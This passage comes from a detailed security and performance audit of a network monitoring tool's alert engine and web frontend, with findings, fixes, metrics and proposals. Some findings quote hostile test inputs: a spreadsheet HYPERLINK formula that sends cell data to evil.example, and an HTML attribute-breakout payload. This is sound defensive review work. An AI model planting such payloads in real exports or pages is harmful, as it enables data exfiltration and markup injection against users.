writes to. Fix: memoise the name beside the device in the same per-drain dict.

**ALRT-F14 (low, correctness).** `_sweep_netpath_alerts` iterates
`self.db.alerts(state="unresolved", rule_id=rule["id"])` and takes the store's default `limit=300`
ordered `last_ts DESC`, while `_pair_ipam_resolutions` passes an explicit `limit=2000` for the same
shape. Past 300 open alerts on one NetPath rule — a multi-site path outage, or a batch of disabled
destinations — every alert past the 300th stays open for ever, which is the docstring's own case
left unfixed for the tail. One-line fix.

**ALRT-F15 (low, security).** `allowed_sources`/`auto_accept_sources` are enforced per message in
`_enqueue`, not per connection, so a source outside the allow list still takes one of the default 64
TCP client slots and one thread for up to 30 seconds per idle period. With an allow list configured,
any host that can reach the port holds all 64 slots: genuine devices are refused, `tcp_refused`
climbs, and the counters say the allow list is working while the transport is fully occupied. Fix:
check `_accepted` immediately after `accept()` and close before taking a slot.

**ALRT-F16 (low, correctness, confidence: likely).** `_within_rate`'s `self._buckets` is a bare
`OrderedDict` reached from the UDP receive thread and from every TCP client thread; the
`get` … `move_to_end` sequence is not atomic against another thread's
`while len(...) > MAX_RATE_SOURCES: popitem(last=False)` eviction loop, so `move_to_end` can raise
`KeyError` for a just-evicted key, and the `messages` counter bump shares the exposure. The losing
thread's exception is swallowed upstream, so one message is silently dropped and `errors` ticks up.
Filed as likely: the race was read, not reproduced. Fix: a lock around the body, the same fix
4.46.4 applied to the poller counters.

**ALRT-F17 (low, security).** `_CONTROL_BYTES` is `[\x00-\x1f\x7f]+`, which closes ESC-based
injection but not U+0080–U+009F: the UTF-8 encoding of U+009B, the 8-bit CSI introducer, decodes
cleanly and is stored verbatim, as are the bidi overrides. The module's own comment says an embedded
escape sequence "is a terminal-escape-injection primitive for any later CLI/export consumer" — the
character class is one range short. The web UI escapes its own output, so this is about the CLI and
export consumers that comment names. Fix: extend the class, keeping the replace-with-one-space
behaviour.

**ALRT-F18 (low, security) — Documented.** With the shipped defaults
(`auto_accept_sources`, `auto_accept_communities`, `acknowledge_informs` all on) any v1/v2c
InformRequest gets a reply sent to the datagram's claimed source, making this host a reflector for
anyone who can spoof a victim's address. Amplification is roughly 1:1 — the reply echoes the varbind
TLV span — so the value to an attacker is low and `allowed_sources` closes it completely. The lead's
verdict was documentation rather than code: RUNBOOK and the SNMP settings help will say that
`acknowledge_informs` on an internet-reachable port makes this host a reflector and name the control.

### Verified sound

- `nfdecode` bounds other than ALRT-F3: the `_decode_v9`/`_decode_ipfix` offset arithmetic, the
  per-exporter template LRU, the zero-length and over-count template refusals, the sampling clamp,
  and the v5 `min(count, (len(data)-24)//48)` clamp. No recursion, and every template field advances
  the offset by at least 1.
- `trapdecode.Reader.read_tlv` refusals and the iterative, capped `_read_varbinds`; `_octets_text`
  only decodes an all-printable run, so trap text cannot carry an escape sequence.
- `alertmail.parse_headers` + `send_webhook`: header injection refused by `http.client.putheader`
  (verified empirically); `_RefuseRedirects` overrides the single extension point all five redirect
  codes route through; SMTP TLS verification on by default; both queues bounded; the mail breaker's
  half-open probe correct.
- `namelookup`: leading-`-` refused before any value reaches `nslookup`'s argv; `_exchange` uses
  `connect()`, `os.urandom` query ids, a whole-exchange deadline and a verbatim question echo check;
  `asn_lookup` gates on `is_global` before opening a socket.
- `tracer`: list argv everywhere, `MAX_EXPECTED_BUDGET_S` cap, and target-host validation that
  rejects a leading `-`.
- `analysis.py`: `clamp_window`, `MAX_BUCKETS`, `MAX_SPAN_S`, `MAX_TIMESTAMP` and `MAX_HOP_FANOUT`
  all bound query-string-derived allocation.
- `mapper.link_csv_rows` → `_csv_cell`: formula leads neutralised, with the comment correctly naming
  SNMP and syslog as the untrusted writer.
- `alertengine` cursor discipline: `has_cursor` versus `cursor`, `_advance_cursor` deferring to
  `_flush_cursors`, and the per-occurrence try/except that counts `apply_errors` and lets the tick
  continue.
- The rollup memoisation caches are cleared at the top of each `_tick`, and `_child_first_breach_ts`
  keys on the string entity id exactly as the three streak dicts do.
- ConfigRX SSH command construction: nothing operator-supplied reaches the wire, the enable secret
  goes only after the device's own prompt matched, and a changed host key aborts the backup rather
  than storing a capture from an unidentified host.
- `configrx_compliance` bounds other than ALRT-F2: `MAX_PATTERN_CHARS`, the 250-character line cap,
  the fail-closed `UnsafeRegex` path, and the `STATUS_NOT_YET_ASSESSED` distinction that keeps a
  truncated sweep from reading as compliant.
- `report.py`: `_merge_intervals` prevents double subtraction, an open maintenance period is clamped
  to now, and `availability_pct` is `None` rather than 0 when nothing was observed.
- `syslogparse`: `MAX_SD_ELEMENTS`, the index-walking structured-data strip, the `MAX_PRI` guard and
  the clock-skew fallback; `syslogd`'s two framings and `MAX_TCP_MESSAGE_BYTES`.
- `UdpReceiver` lifecycle: `running` requires every thread alive, `_guard` records a crash, the join
  budget is shared across the set, and no loop busy-waits.

---

## Frontend core

`netpath/web/static/app.js` (5,500 lines), `nodes.js` (6,676), `dashboard.js`, `events.js`,
`boot.js`, `tokens.css`, with `index.html` and `app.css` read in the parts that matter. Everything
below was verified against a running instance — the 12-device demo fleet plus 800 bulk-imported rows
to reach 812 devices — driven from Chromium via Playwright.

Output escaping is the strongest part of this area and was checked exhaustively: every `${…}`
interpolation in the four files was enumerated by script and the ~180 that touch server data
hand-checked, with a live confirmation that set a device name to a markup payload and walked the
list, the detail pane and three dialogs without a single `pageerror` or a fired handler. One sink
escapes nothing (FE-F10) and its field is numeric today. The real weight here is performance: four
high findings, all the same shape — a refresh that fetches configuration at telemetry cadence, or an
entire collection to use one row of it. The measured totals are large enough to matter on a NOC
wall. This lane is complete.

**FE-F1 (high, correctness).** 4.47.0 made `/api/nodes/devices` server-side paged, but `refresh()`
still treats `view.devices` as the fleet: `nodes.js:6250` clears `view.selected` when it is not in
the current page and then selects `view.devices[0].id`. Deep links, the global search, the MAC/ARP
links and `selectDevice()` all select by id and none can guarantee the id is on page 1. Measured on
812 devices at 500 per page: opening `#/nodes/device/9` showed core-sw-02 at 2,000 ms and 8,000 ms,
and `acc-sw-002` at 22,000 ms — with the address bar still reading `#/nodes/device/9`. An escalation
link pasted into a ticket shows the wrong device to whoever opens it and waits ten seconds. Fix:
clear the selection only when the page covers the whole result set (`view.pageTotal <=
view.devices.length`); `loadDetail()` already fetches by id and does not read `view.devices`.

**FE-F2 (high, security/correctness).** `initKiosk()` interpolates the untrusted `rotate` query
parameter into a CSS attribute selector at `app.js:4661`; a value containing a quote makes the
selector invalid, `querySelector` throws, and because `initKiosk()` is called bare inside `start()`
the throw aborts everything after it — splitters, density, the `visibilitychange` handler, every
module's `init()`, the route application and `restartTimer()`. Loading `/?kiosk=1&rotate=a%22` gave
`PAGEERROR: … '.tab[data-tab="a""]' is not a valid selector` and
`state: {"timer":false,"tab":"dashboard","dashHtml":0,"conn":""}` — the master poll loop never
started and the dashboard never drew. The page renders the shell and nothing else, with no error
anyone can act on, and reloading fails the same way. Fix: validate the name with `/^[a-z]+$/` the
way `boot.js:35` already validates the stored tab (in `drawKioskDots` too), and wrap `initKiosk()`
in try/catch — nothing in it is worth taking the application down for.

**FE-F3 (high, performance).** Every `nodes_refresh_s` tick re-fetches the current page of devices
plus `/api/nodes/groups`, `/api/nodes/device-groups`, `/api/nodes/mibs` and `/api/nodes/discovery`,
and redraws the Profiles, MIBs and Discovery tables whether or not their subtab is on screen — nine
requests per tick, four of which answer questions nobody asked. Measured over 40 s idle on Nodes at
500 rows: **56 calls, 3.64 MiB**, with long tasks of 611, 348, 182 and 185 ms — the UI frozen for
180–350 ms every interval. The paged device list alone is 916,822 bytes; `/api/nodes/mibs` is
3,578 bytes for the 21 bundled MIBs, and the catalogue offers 252 more files, so a MIB-heavy install
pays roughly 46 KB of MIB metadata per tick. Instrumenting the draw helpers accounted for only
~100 ms of the 1,326 ms, so the cost is transfer, `response.json()` and the tbody swap. Fix, in two
contained steps: fetch the three configuration endpoints on `config_version` movement, the pattern
`loadConfig()` already uses; and draw the hidden subtabs only when visible, the way
`discoveryVisible()` already gates its neighbour. A conditional GET for the device list itself is P3.

**FE-F4 (high, performance).** To refresh one port's stats line, the port dialog re-fetches the
device's entire interface list and entire event log every 5 s and its entire metric catalogue every
15 s, then discards all but one row and two ids. On the demo instance `/interfaces` is 263,243 bytes
and `/metrics` is 570,252 bytes for device 9; opening `#/nodes/device/9/port/1` and leaving it for
31 s moved **4.48 MiB**. On a NOC wall with a port dialog parked open that is ~150 KiB/s per screen,
indefinitely, against endpoints that each take the nodes-db lock. Fix: a single-interface read
(`GET …/interfaces?if_index=<n>` returning the same shape filtered — a contract the api lane
implements) and caching the two metric ids in the dialog's closure, since they cannot change while
it is open.

**FE-F5 (medium, performance).** `drawCapabilitiesTab()` does `rfEl.innerHTML = rf.map(...)`,
destroying and recreating every RF chart container, and then starts one `/series` request per RF
metric — on every refresh tick while the pane is on screen. The device dialog's RESOURCES charts
solve exactly this with `resourceHolder()`, keyed by `data-res-metric`; the RF section never got it.
On a six-metric PtP link at the 2 s default that is three series requests and three SVG rebuilds a
second, with any tooltip or keyboard focus inside them destroyed each time. Confirmed by reading —
the demo fleet carries no `rf_*` metrics (U1). Fix: the `resourceHolder` treatment plus a slower
series clock.

**FE-F6 (medium, performance).** `App.deviceIndex()` calls `get('/api/nodes/devices')` with no
`limit` to build two Maps that need only `{id, ip, name, device_group_id}` — the one full-fleet fetch
4.47.0's paging work left behind, refreshed every 30 s for whichever modules are open. Measured:
**1,513,393 bytes for 812 devices** (~1.9 KB/device), so a 2,000-device fleet is ~3.7 MB per 30 s per
open tab, decoded on the main thread, for a Host-column link. Eight call sites across six modules
depend on it, so a NOC with Alerts, Syslog and IPAM open pays it three times over. Fix: a
`fields=index` projection on the devices route returning the seven keys every consumer reads (api
lane implements the contract), and one line in `deviceIndex()`.

**FE-F7 (medium, security).** The availability and Top-N report exports are the only two CSVs built
in the browser, and `csvField` (`nodes.js:3776`) does RFC 4180 quoting and nothing else, while the
server's `_csv_text` — which every other export goes through — prefixes an apostrophe to any cell
starting `= + - @ \t \r`. With device 3 renamed to `=HYPERLINK("http://evil.example/?x"&A1,"click")`
the client-built CSV carried the live formula and the server-built export of the same device carried
the guarded `'=HYPERLINK(…`. A device name can come from its own sysName, and the Top-N export's
metric `label` can come from a custom MIB. Fix: three lines in `csvField` using the same lead set as
`api._CSV_FORMULA_LEAD`.

**FE-F8 (low, correctness/design).** `App.modal()` escapes a plain-string title itself — deliberately,
"seven call sites interpolated them raw" — so the three call sites that escape first
(`deviceDialog`, `mergeDialog`, `openApprovalDialog`) double-escape. A device named `R1 & R2 <core>`
gets a heading of `R1 &amp; R2 &lt;core&gt;`; `deviceDialog` normally overwrites it when the detail
fetch lands, but its `.catch` writes only `#ndd-summary`, so aborting that fetch leaves the mangled
heading for the life of the dialog (captured: `textContent: "R1 &amp; R2 &lt;core&gt;"`). The other
two never correct theirs. Fix: drop `escape()` from the three titles and have the catch set the
heading from the listed row.

**FE-F9 (low, design/accessibility).** `resolveMacSearch`'s `show()`, `discStatus()` and
`profileStatus()` write to a plain `<div>`/`<span>`/`<p>` with no live-region role and never call
`App.announce`, against a house convention that `#set-apply-status` follows —
`grep 'role="status"\|aria-live' index.html` returns only `#conn`, `#set-apply-status` and `#live`.
A screen-reader user typing a MAC into the Find box gets the entire answer announced nowhere. Fix:
one `App.announce` per writer.

**FE-F10 (low, security).** `domValueCell` is the one cell in the DOM/SFP tables that does not escape
its value, where its own neighbour in the hardware sensor table writes `escape(value)`. The field is
device-supplied and reaches two `innerHTML` assignments; it is numeric today only because
`nodepoll.read_dom` coerces it, which is why this is defence in depth rather than a live hole. Fix:
`escape(String(s.value))`.

### Verified sound

- Output escaping across `app.js`, `nodes.js`, `events.js` and `dashboard.js`: every interpolation
  enumerated, the ~180 touching server data hand-checked, and a live payload walk that left
  `window.__xss` false with no `pageerror`. `App.escapeHtml` covers `& < > " ' \``, and no attribute
  in these files is unquoted.
- `testDevice` escapes each part last, which is the correct order; `varbindSummary`'s consumers
  escape the finished string; the trap and syslog test dialogs interpolate only a hard-coded host
  and an int.
- The CSP has no `script-src` of its own, so script falls back to `default-src 'self'`: no inline
  script, no CDN, with `base-uri 'none'`, `frame-ancestors 'none'` and `form-action 'self'` set.
- No `postMessage`, no `message` listener, no `window.opener` read; both `window.open` sites null the
  opener on a same-origin handle.
- localStorage holds no credential or token; `.view` is stamped with the username and discarded on a
  different sign-in; every read and write is inside try/catch.
- Hidden tabs really do stop polling, and returning raises the stale banner and forces an immediate
  `/api/state`.
- Stale-response races: the per-URL in-flight abort, `page.refreshing`/`trailing`, and seven
  generation guards were each traced — no path lets an older answer paint over a newer one, and the
  `superseded` flag keeps an aborted GET from being reported as an outage.
- Listener and timer lifetimes: row-keyboard wiring guarded against stacking, all four dialog
  intervals torn down on `modal-closed` **and** re-checking `modalIsCurrent`, the `notified` Set
  bounded at 500, both row caches pruning. Heap after 40 s on a 500-row page was 9.5 MiB, flat.
- Search debouncing (150 ms with a token) and per-page filters that fire on Enter/change/Apply, not
  per keystroke.
- All three contract suites — `test_frontend_contracts.py`, `test_layout_contracts.py`,
  `test_design_tokens.py` — pass on this tree, and none of the fixes touches a string they pin.

---

## Frontend modules

`netpath/web/static/alerts.js`, `mapper.js`, `netflow.js`, `debug.js`, `wireless.js`, `ssh.*` read
end to end; `configrx.js`, `settings.js`, `netpath.js`, `ipam.js` read for every DOM sink, fetch path
and listener registration.

Two markup-injection findings and nine performance or consistency ones. The injections are worth
reading with the CSP in mind: `server.py:881-885` sends `default-src 'self'` with no `script-src`
override and no `'unsafe-inline'` for script, so in a compliant browser an injected `onerror=` does
not run — these are markup injection into a trusted page (defacement, an off-site link, a fake
credential prompt drawn over the UI with `style-src 'unsafe-inline'`) rather than session theft, on
a deployment whose CSP header survives the proxy in front of it. Neither file is relying on the CSP
deliberately: every neighbouring interpolation in both is escaped, so these read as omissions. The
performance findings are all the same story as the frontend-core ones — a pattern the same codebase
already uses correctly somewhere else, not applied here. This lane is complete: 11 fixes, three
contracts, 63 browser-walk checks.

**FM-F1 (high, security).** `overridesCellHtml()` builds `data-rule-key="${r.key}"` with the raw
server string at `alerts.js:875` while every other field in that table goes through `escape`, and
`post_alerts_rule` (`api.py:6967`) checks only that key, name and kind are non-empty and that kind is
in its list — no character validation at all. An account with `alerts: write` (not admin) can save a
rule key of `x" autofocus onfocus="…`, and from then on every account with `alerts: read` —
administrators included — parses the attacker's markup into their DOM when they open the Rules
subtab. Reproduced with the file's own escape shim. Fixed by escaping the attribute; the api lane
additionally validates the key charset, since rule keys are stable identifiers, not prose.

**FM-F2 (medium, security).** `showDetail()` escapes `radio_id`, `mode`, `powerText(...)`, `model`,
`mac_address` and `status`, and then writes `channel` raw at `wireless.js:213`. `channel` is not a
number: `wirelessdb.py:51` types the column TEXT, `fortipoll.py:289` stores `str(channel)`, and
`trapdecode._octets_text`'s `_PRINTABLE` set includes `<`, `>`, `"` and `'`, so a hostile or
compromised device answering at a configured controller's address can return markup for
`WTP_RADIO_CHANNEL` and have any `wireless: read` account parse it. `#wl-detail` being a `<pre>`
changes nothing — `innerHTML` parses markup there as anywhere. Fixed by escaping; storing
`str(int(channel))` was left alone as the larger change.

**FM-F3 (medium, performance).** `move()` calls `redrawDragged()` directly at `mapper.js:1540`,
where every other redraw caller goes through the rAF-coalesced `requestDraw` — whose own comment
states the exact problem ("a pointermove fires faster than 60 Hz and used to rebuild the whole scene
synchronously, inside the event"). `redrawDragged` tears down and rebuilds each attached link's SVG
subtree including `wireOne`'s four-to-six `addEventListener` calls per path, and up to
`max_strand_vlans` paths per link in strands mode; rubber-banding a 2,000-node map puts every node in
the selection. Fixed: the redraw is coalesced to one per animation frame, with its own pending handle
so a node drag and a full redraw do not cancel each other.

**FM-F4 (medium, performance).** `passes(event)` calls `categoriesOn()` —
`querySelectorAll('input')` plus a fresh `Set` — and reads the destination and search inputs **once
per event**, and `drawEvents` runs it over a buffer of up to 3,000 rows on every one-second poll,
including the append fast path. The string half alone measured 2.2 ms per draw at 3,000 events with a
12-line detail; the DOM half is the larger and could not be measured without a browser. Fixed: the
filter is read once per draw and once per export.

**FM-F5 (medium, performance).** Both chart modules put the in-progress drag into the redraw
signature so the brush appears, which means every pointermove misses the signature and runs
`svg.innerHTML = ''` — grid, axes, one polygon per series, ticks, legend and six pointer handlers —
for a gesture whose only visible change is one rectangle's x and width. NetFlow additionally computes
`JSON.stringify(view.data)` for that signature on every event: measured at 0.459 ms on a
9-series × 360-bucket payload, i.e. 55.0 ms/s at 120 pointermove/s, ~5.5% of a core before any DOM
work. `mapper.js`'s `drawRubber` already has the right pattern and says so. Fixed: a persistent brush
rect moved in place, and the drag dropped from both signatures.

**FM-F6 (low, performance).** `refresh()` issues nine parallel requests every 10 s, four of them
configuration that changes only when someone edits it — `/api/alerts/rules`, `…/rules/extras`,
`…/templates` and the fleet-wide `…/device-thresholds` with no `device_id` — while every editor in
the file already calls `App.refreshNow('alerts')` on success. Ten operators with the tab open pull
the whole rules table, the whole template table and every per-device override in the fleet six times
a minute each. Fixed: on opening the tab, after any local edit, and otherwise once a minute.

**FM-F7 (low, performance).** `drawTimeline` reads `timelineEl.getBoundingClientRect()` at
`netpath.js:914`, **before** the signature check at `:928` that exists precisely to avoid redrawing
an idle timeline — so a forced synchronous layout ten times a second on an idle page. `mapper.js`'s
`drawToolbarState` writes five `.disabled` properties unconditionally at the same cadence, in a
codebase whose own helper comment says an unconditional write still queues a real mutation. Fixed:
measure once and on resize; compare before assigning.

**FM-F8 (low, performance/design).** `fillRuleFilter` (alerts), the controller filter (wireless) and
`drawVendorFilter` (configrx) each do a bare `select.innerHTML = …` on every refresh and then
re-assign `.value`, destroying and rebuilding an option list that is identical almost always, where
`App.setHtml` is write-only-if-changed and every one of the three could use it unmodified. Fixed.

**FM-F9 (low, correctness/maintainability).** `editTemplate(id)` resolves
`view.templates.find((x) => x.id === id)`, and the Reset-to-default cancel callback passes the
template **object**, so the lookup always falls through to the `view.templatesSelected` branch. It is
masked today because every path that opens the editor makes the two agree; it breaks the moment
anything opens the editor for a template that is not the selected row. Fixed: `editTemplate(t.id)`,
so cancelling a reset reopens that template rather than whichever row is selected.

**FM-F10 (low, maintainability).** Every other module in this area opens `refresh()` with
`if (App.state.tab !== '<tab>') return;` and re-checks after its awaits; `ipam.js` has neither and
`wireless.js` has only the entry check, so a tab switch during either of its awaits still runs
`showDetail`, `drawTable` and two status passes against a hidden page. Not a visible bug — wasted
paint after a tab switch — but it is the one place the house pattern is not followed, which is what
makes the next reader assume the guard is unnecessary. Fixed.

**FM-F11 (low, maintainability).** `ssh.html:26`'s comment says "Escape is the documented,
keyboard-only way out", the visible hint one line below says Ctrl+F6, and
`attachCustomKeyEventHandler` intercepts only `F6 && ctrlKey` — with `ssh.js:196` explaining that
Escape deliberately is *not* the exit because it is a real keystroke to the device. A maintainer
following the comment would break vi, less and every menu console. Fixed: the comment.

### Verified sound

- No listener leaks across tab switches: every `window`/`document` listener in these nine modules is
  registered exactly once inside `init()` and guarded by the tab check; no `setInterval` anywhere in
  them.
- Stale-response races: `App.refreshNow` serialises per page with a single trailing run, `call()`
  aborts a previous in-flight GET to the same URL, and alerts, configrx, netflow, mapper and netpath
  each carry a generation guard on top; four post-await identity re-checks confirmed.
- The SSH page passes no token in the URL — authentication rides on the session cookie; every DOM
  write on that page is `textContent`; `closeSocket` detaches handlers before closing, the close
  message is stashed per socket, 4401 redirects to `/login`, and `beforeunload` tears the session
  down.
- `App.buildRoute` encodes every path part and builds the query with `URLSearchParams`, so the many
  `href="${App.buildRoute(...)}"` interpolations cannot break out even when fed a device-supplied MAC
  or hostname.
- `App.tooltip` builds rows with `createTextNode`/`textContent` only, and `App.svgNode` sets text via
  `textContent`, so every tooltip and every SVG label in this area is inert regardless of content.
  `App.drawRows` escapes any column with no `cell:` renderer — which is what kept wireless's table
  columns safe even though its detail pane's channel line was not.
- `configrx.js` renders nothing unescaped: the diff viewer escapes every line, the raw config goes to
  `textContent`, and the host key, search results, rule sets and per-device results are all escaped.
- `alerts.js`'s dialog scaffolding: modal titles go through `App.modal`, and `App.form.text/number`
  do not escape but every caller in `alerts.js` and `netflow.js` escapes at the call site.
- `debug.js`'s event rows are built with `createElement` + `textContent` deliberately, and its
  append-only redraw path and 150 ms search debounce are real optimisations that hold.

---

## Cross-cutting assessment, by lens

### Security

The posture is better than the finding count suggests, and the reviewers' "verified sound" lists are
the evidence: the whole route table's gating checked line by line with no missing gate; every
caller-supplied filter reaching SQL bound rather than interpolated; path traversal closed with
`normpath` + `commonpath` and the reason for not using `startswith` written down; CSRF closed three
ways over; scrypt at N=2^17 with a constant-cost decoy; a portable secret store that refuses the
OpenSSL parameter shapes by name and verifies its MAC before returning any plaintext; an LDAP client
that rejects DN metacharacters rather than escaping them; an update tarball guard that drops links
and devices and resolves every member against `realpath`; a BER decoder with bounds on every length
and no recursion anywhere; verify-then-decrypt ordering with the keystream oracle deliberately closed;
output escaping across four frontend files enumerated by script and confirmed live. Four of the seven
areas found zero injection defects of any kind.

Three patterns account for the defects that exist.

**Unbounded caller-chosen allocation.** The caller — sometimes authenticated at read level, sometimes
not authenticated at all, sometimes a device on the wire — picks a number and the process allocates
against it. WEB-F1 (a negative length reads to EOF), WEB-F4 (a thread per connection with no ceiling),
API-F1 (1.6 M bucket dicts from one query string), API-F3 (79,800 pairs and 159,600 queries),
API-F4 (one SQL placeholder per id), ALRT-F1 (an unbounded list of learned rates, each costing a
window-wide UPDATE), ALRT-F2 (a regex whose backtracking is the allocation), ALRT-F3 (one flow per
byte of a datagram), POLL-F1 (a multi-billion-digit integer from one SNMP Integer32), POLL-F2 (an
encoder loop that never terminates), POLL-F3 (3.1 GB retained from a 16,384-row cap that counts rows,
not bytes). The house already knows the answer in most of these places — `FLOW_MAX_BUCKETS`, `_page`,
`id_chunks`, `MAX_SAMPLING`, the template LRU — and the defect is consistently that one path did not
use it.

**Gates that do not match the handler.** The route table is right; some handlers are not. API-F2 is
the sharp one: a read gate over a call that deletes another account's work, against a route comment
that says watching does not need write. API-F5 filters the event stream by module with an explicit
comment about what the stream leaks and then returns the same class of data unfiltered beside it.
API-F11's missing `_require` calls are the benign version of the same drift, and its bare
`PermissionError` would bounce a valid session to the sign-in page if the gate were ever loosened.
WEB-F2/API-F12 is an ordering version: the work happens before the gate is consulted. WEB-F9 is the
runtime version: a liveness check that fails open where its neighbour on the line above fails closed,
against a documented promise that a revoked grant ends a live shell in seconds.

**A secret that missed the serialiser boundary.** Five serialisers thread `_may_read_secrets`
correctly and the exceptions are each one path that was never brought in: the trap rows' community
and v3 user name (API-F6), the trap receiver's v3 auth password living in a settings row as plain
JSON (DATA-F1), and the webhook URL and headers, which *are* the bearer credential for Slack, Teams
and PagerDuty (ALRT-F9). All three contradict text in `CREDENTIAL-SECURITY.md`, and in two cases the
document has no row for that credential at all. FE-F7, FM-F1, FM-F2 and FE-F10 are the frontend
version of the same class — one call to `escape` missing in a function where every neighbouring line
has it. The reviewers' P3 (api) and P1 (frontend-modules) both propose making the omission a test
failure rather than a review finding, which is the right conclusion to draw from four independent
sightings.

### Performance

Every performance finding in this review is one of four shapes, and in each case the codebase already
contains a correct example of the thing that should have been done.

**Per-row work where a batch helper already existed.** API-F7 (one `device_config` per device, with
`all_device_configs()` used four lines of code away — 26.0 ms against 10.4 ms at 1,000 devices),
API-F8 (three `device()` reads per assignment, 150 for 50, against `devices_by_ids`), API-F9
(`SELECT *` on the whole fleet for a three-key dropdown, against `device_summaries()`), API-F13 and
its store half (500 commits / 41 ms → 1 commit / 4 ms), ALRT-F6 (every DHCP lease read per 5 s tick:
109.8 ms against 5.6 ms for the `GROUP BY`), ALRT-F10 (14 `rule_by_key` queries per absorbed alert
with the answers already in memory), ALRT-F13 (one `hostnames()` per drained row: 19.5 ms against
6.4 ms for 2,000), POLL-F5 (one socket and one credential decrypt per interface: 33 → 1 for 32
interfaces).

**Prefix LIKE where a range predicate belongs.** DATA-F2 is the expensive one — `has_mib_covering`
on every poll of every device, 9.385 ms → 0.006 ms at 120,000 objects, ~17% of a core and ~17% duty
cycle on that store's lock at the shipped fleet size — and the same file's `enterprise_objects`
already carries the range expression with a comment explaining why. DATA-F5 is the correctness face
of the same habit: ten unescaped LIKE needles, where `appdb.audit_query` is the one that does it
right. DATA-F3 is the neighbouring case of a query with no index at all: 106.5 ms every five seconds
to find five pending notifications, 0.1 ms after a partial index.

**Unbatched prunes.** DATA-F4: two stores left out of 5.5.0's batching pass, measured at 919 ms and
1,259 ms of worst reader stall on 400k and 500k rows, and a maintenance button that issues
`DELETE FROM samples` for ~86 M rows in one statement on the HTTP request thread — beside three
sibling buttons that are batched. For scale, the 5.5.0 changelog quotes the stalls it *fixed* as
syslog 6,418 → 2,120 ms and alerts 3,634 → 185 ms.

**Per-tick refetch of configuration.** The frontend version of the same idea, and the largest raw
numbers in the review. FE-F3: 56 calls and 3.64 MiB in 40 s idle on Nodes, with 180–350 ms long tasks
per tick, of which the three configuration endpoints are pure waste. FE-F4: 4.48 MiB in 31 s for one
port dialog, ~150 KiB/s per screen. FE-F6: 1,513,393 bytes every 30 s per open tab for a Host-column
link, paid once per open module. FM-F6: four configuration endpoints every 10 s in Alerts. POLL-F7 is
the server-side twin: two full settings reads per column walk, ~60,000 lock acquisitions a minute at
1,000 devices, in a module whose pool settings are cached at `reconfigure()` precisely so the
scheduler's statement count can be pinned by a test. FM-F3, FM-F5 and FM-F7 are the input-event
version: work at pointer or 10 Hz rate that the same files already coalesce correctly elsewhere.

### Design quality and maintainability

The metrics say what the reading says: a few files carry far more than their share, and every one of
them is a file where a finding survived because no reader can hold it in their head.

| Measure | Figure |
|---|---|
| Largest Python module | `netpath/web/api.py` — 9,745 lines, 425 top-level functions |
| Next four | `nodepoll.py` 7,531 · `nodesdb.py` 4,765 · `alertengine.py` 3,263 · `alertsdb.py` 3,231 |
| Longest function | `NodePoller._poll_device` — 661 lines, 110 branch nodes |
| Next three | `AlertEngine._evaluate_thresholds` 357/65 · `post_nodes_device_test` 309/46 · `read_device_vlans` 300/47 |
| Largest JS modules | `nodes.js` 6,676 · `app.js` 5,500 · `mapper.js` 2,397 · `alerts.js` 2,043 |
| Exception handling | 0 bare `except:`, 145 `except Exception`, 5 `except BaseException`, **52 silent-swallow bodies** |
| Duplication (Python) | 51 deduplicated blocks; largest 24 lines (`alertmail.py:476-505` / `:748-772`) |
| Duplication (JS) | 8 blocks; largest 20 lines (`events.js:14-36` / `netflow.js:1048-1070`) |
| Import cycles | exactly one: `netpath.nodepoll → netpath.nodediscover → netpath.nodepoll` |
| DOM sinks | 192 `innerHTML`/`insertAdjacentHTML`/`outerHTML` sites; no `eval`, no `new Function` |
| SQL built by formatting | 200 sites (clause fragments and column lists; values bound) |
| Subprocess sites | 9, all argument lists, none with `shell=True` |

The 52 silent swallows are concentrated rather than spread: `sshterm.py` 12 (of 18 handlers),
`monitor.py` 10 (of 18), `console.py` 4 (of 6), `webrelay.py` 4 (of 5), `nodepoll.py` 4,
`selfupdate.py` 2, `configrx.py` 2, `web/api.py` 2, `web/service.py` 2, `fortipoll.py` 2, and one each
in `alertengine.py`, `alertmail.py`, `hostkeys.py`, `namelookup.py`, `nodediscover.py`,
`procstats.py`, `snmptrapd.py`, `syslogd.py`. Two of them are findings in their own right
(`sshterm.py:784` and `webrelay.py:959` are WEB-F9), one is the mechanism that makes API-F10 silent,
and the poller's 35 `except SnmpError: pass` sites — not counted above, since they name a specific
exception — are P3 in that area, because they swallow credential verdicts alongside "this optional
object does not exist".

The duplication figures are modest in total but instructive in kind. Five of the largest Python
blocks are `snmptrapdb.py` against `syslogdb.py` (14, 13, 13, 11 and 10 lines) — two stores that
answer the same shape of question with the same code, which is what the data reviewer's P2 is about.
The 10-line JS block `app.js:4313-4322` / `nodes.js:417-426` is the row-diff cache that the frontend
reviewer's P1 proposes merging; both copies' comments already acknowledge the split.

Two smaller observations from the metrics pass, recorded because nobody else owns them: the installed
paramiko is 5.0.0 while `requirements.txt` pins `>=3.4,<5` with a comment explaining the cap, and
both SSH suites pass outright on that version rather than taking `run_all.py`'s `SKIP_EXIT_CODE = 77`
path — so either the cap or the comment is now out of date. And five symbols appear exactly once in a
whole-tree identifier scan (`AlertsDatabase.purge_expired_mutes`, `_Tee.isatty`, and `Handler`'s
`do_HEAD`/`do_PUT`/`do_DELETE`); the last three are reflective dispatch and the first two want a
human's eye, not a deletion.

#### Proposals

The 30 proposals the reviewers raised, none of which is part of this pass. Size is a rough estimate:
*small* is a contained change with an existing test to extend; *medium* touches several files or
needs a new test shape; *large* is a release of its own.

| ID | Area | Proposal | Size |
|---|---|---|---|
| WEB-P1 | Web core | One `_framing()` verdict per request shared by `_body` and `_drain_request_body` — the durable form of WEB-F1/F3/F4 | medium |
| WEB-P2 | Web core | Finish the verified update path: `latest_tag`/`published_digest`/`tarball_name` exist and are tested but `apply()` follows the mutable `main` tip | medium |
| WEB-P3 | Web core | One permission table that `permissions.MODULES`, `server.ROUTES`, `api.SETTINGS_SCOPES` and `service._MODULE_SCOPES` all derive from | medium |
| WEB-P4 | Web core | A bounded queue answering 503 in front of the 4-slot login semaphore, instead of parking unbounded threads | small |
| API-P1 | API | One windowing contract: `_window(params, default_span_s, max_buckets)` as the only way a handler reads a time range (five routes still use bare `_num`) | medium |
| API-P2 | API | `_bulk_ids(body, key, cap)` as the one bulk-list reader, plus a store rule that every `IN` goes through `id_chunks` | medium |
| API-P3 | API | A `reveal`-aware serialiser boundary, or one module constant listing the secret-bearing columns every serialiser must consult | medium |
| API-P4 | API | Split `get_debug` — 170 lines assembling eight sections with different permission requirements | small |
| API-P5 | API | `api.NotFound(ValueError)` with its own dispatch arm so `_require` produces a 404, as its docstring already claims | small |
